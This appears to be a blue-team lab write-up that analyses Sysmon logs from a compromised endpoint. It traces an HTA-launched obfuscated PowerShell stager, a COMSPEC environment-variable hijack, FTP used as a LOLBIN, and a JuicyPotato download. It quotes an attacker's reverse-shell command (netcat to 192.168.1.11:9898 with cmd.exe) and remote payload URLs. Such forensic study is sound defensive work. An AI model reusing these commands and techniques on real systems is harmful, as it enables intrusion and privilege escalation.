Log Analysis - Sysmon (BTLO)

Scenario

You are provided with Sysmon logs from a compromised endpoint. Analyse the logs to find out the steps and techniques used by the attacker.

https://blueteamlabs.online/home/challenge/log-analysis-sysmon-fabcb83517

1- What is the file that gave access to the attacker?

updater.hta

We can see mshta.exe a know lolbas executed a local HTA file (updater.hta), which spawned a heavily obfuscated PowerShell script. The script hid its window, bypassed execution policy, and created a WebClient to send system information (hostname, username, domain, etc.) to the attacker's server. It then downloaded and executed a second-stage payload from a remote URL(http://65.21.255.53:6969/index.php), allowing the attacker to run additional code on the system.

2- What is the powershell cmdlet used to download the malware file and what is the port?

Invoke-WebRequest, 6969

the attacker uses Invoke-WebRequest cmdlet to download the malware with port 6969 likely to avoid detection or bypass firewall rules

3- What is the name of the environment variable set by the attacker?

comspec=c:\Windows\temp\supply.exe

The attacker sets the COMSPEC environment variable to a custom binary (supply.exe) located in the temp directory. This is a trick to hijack calls to cmd.exe, making Windows processes unknowingly execute the attacker’s binary instead.

4- What is the process used as a LOLBIN to execute malicious commands?

FTP.exe

first i thought it was mshta or powershell but after the powershell we can see ftp executing the malware supply.exe

5- Malware executed multiple same commands at a time, what is the first command executed?

ipconfig

6- Looking at the dependency events around the malware, can you able to figure out the language, the malware is written

Python

we can see supply.exe target Python27.dll

7- Malware then downloads a new file, find out the full url of the file download

https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe

This URL is used to download JuicyPotato.exe, a well-known Windows privilege escalation tool that abuses token privileges to elevate access to SYSTEM.

8- What is the port the attacker attempts to get reverse shell?

9898

"C:\\windows\\temp\\supply.exe /c \"juicy.exe -l 9999 -p nc.exe -a \\\"192.168.1.11 9898 -e cmd.exe\\\" ..." This tells us :

The attacker used juicy.exe (known privilege escalation tool).

It listens on port 9999 (-l 9999).

It uses nc.exe (Netcat) to connect back to IP 192.168.1.11 on port 9898 (-a "192.168.1.11 9898 -e cmd.exe"), which is the reverse shell payload.

The reverse shell executes cmd.exe, giving the attacker a command prompt.

So port 9898 is where the attacker tries to get a reverse shell.
